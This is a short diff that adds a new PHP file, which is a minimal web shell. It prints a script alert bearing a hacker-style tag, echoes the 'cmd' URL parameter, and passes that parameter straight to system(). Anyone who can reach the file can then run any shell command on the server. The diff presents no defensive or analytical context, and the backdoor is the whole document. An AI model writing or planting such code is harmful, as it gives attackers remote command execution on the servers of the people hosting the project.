@@ -1,0 +1,6 @@
+<?php
+echo "<script>alert('El L337');</script>";
+echo "Run command: ".htmlspecialchars($_GET['cmd']);
+
+system($_GET['cmd']);
+?>
